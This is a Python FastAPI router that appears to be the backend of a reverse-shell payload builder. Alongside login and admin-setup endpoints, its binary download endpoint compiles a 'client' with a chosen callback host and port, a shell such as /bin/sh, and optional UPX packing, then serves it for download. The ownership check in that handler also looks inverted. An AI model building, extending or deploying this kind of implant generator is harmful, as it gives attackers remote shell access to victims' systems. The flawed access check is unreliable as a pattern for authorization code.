import uuid
from secrets import token_urlsafe

import sqlalchemy as sa
from fastapi import APIRouter, HTTPException, Response
from sqlalchemy import orm
from starlette.status import (
    HTTP_204_NO_CONTENT,
    HTTP_403_FORBIDDEN,
    HTTP_404_NOT_FOUND,
    HTTP_500_INTERNAL_SERVER_ERROR,
)

from ..client.compile import compile_client
from .auth import UserSessionDependency, login, require_role, rotate_session
from .config import SettingsDependency
from .db import Clients, DatabaseSessionDependency, UserRoles, Users
from .models import (
    ClientCreation,
    ClientResponse,
    SessionCreation,
    SessionCreationResponse,
    UserCreation,
)

router = APIRouter(prefix="/api")


@router.post("/session")
async def create_session(
    model: SessionCreation,
    db: DatabaseSessionDependency,
    settings: SettingsDependency,
) -> SessionCreationResponse:
    """Login a user and create a session"""
    session, token = await login(model.username, model.password, db, settings)
    return SessionCreationResponse(session_data=session, token=token)


@router.delete("/session", response_model=None, status_code=HTTP_204_NO_CONTENT)
async def delete_session(user: UserSessionDependency, db: DatabaseSessionDependency):
    """Logout a user"""
    await rotate_session(user.username, db)


@router.put("/admin/init")
async def create_user(
    model: UserCreation, db: DatabaseSessionDependency, settings: SettingsDependency
) -> SessionCreationResponse:
    """Create an admin user for first-time setup"""
    result = await db.scalars(sa.func.count(Users.id_))
    if result.first():
        raise HTTPException(HTTP_403_FORBIDDEN, "Admin user already exists")
    await db.execute(
        sa.insert(Users).values(**model.model_dump(), role=UserRoles.admin)
    )
    await rotate_session(model.username, db)
    session, token = await login(model.username, model.password, db, settings)
    return SessionCreationResponse(session_data=session, token=token)


@router.put("/client", dependencies=[require_role(UserRoles.user)])
async def create_client(
    model: ClientCreation, user: UserSessionDependency, db: DatabaseSessionDependency
) -> ClientResponse:
    """Create a client"""
    result = await db.execute(
        sa.insert(Clients)
        .values(
            **model.model_dump(),
            owner_id=user.uid,
            encrypt_key=token_urlsafe(24),
        )
        .returning(Clients)
    )
    if (result := result.first()) is None:
        raise HTTPException(HTTP_500_INTERNAL_SERVER_ERROR, "Failed to create client")
    client, *_ = result
    return ClientResponse.model_validate(client)


@router.get("/client", dependencies=[require_role(UserRoles.user)])
async def list_clients(
    user: UserSessionDependency, db: DatabaseSessionDependency
) -> list[ClientResponse]:
    """List all clients"""
    stmt = sa.select(Clients)
    if user.role < UserRoles.admin:
        stmt = stmt.filter(Clients.owner_id == user.uid)
    clients = await db.scalars(stmt)
    return [ClientResponse.model_validate(client) for client in clients.all()]


@router.get(
    "/client/{client_id}/binary",
    dependencies=[require_role(UserRoles.user)],
    response_class=Response,
)
async def download_client_binary(
    client_id: uuid.UUID,
    user: UserSessionDependency,
    db: DatabaseSessionDependency,
    shell: str = "/bin/sh",
    reverse_host: str = "127.0.0.1",
    reverse_port: int = 2333,
    upx: bool = False,
):
    client = await db.scalars(
        sa.select(Clients)
        .filter(Clients.id_ == client_id)
        .options(orm.selectinload(Clients.owner))
    )
    if (client := client.first()) is None:
        raise HTTPException(HTTP_404_NOT_FOUND, "Client not found")
    if client.owner.role > UserRoles.admin and client.owner_id != user.uid:
        raise HTTPException(HTTP_403_FORBIDDEN, "Insufficient role")
    compiled_client = await compile_client(
        client.encrypt_key, (reverse_host, reverse_port), shell_command=shell, upx=upx
    )
    return Response(
        compiled_client,
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{client.client_name}"'},
    )
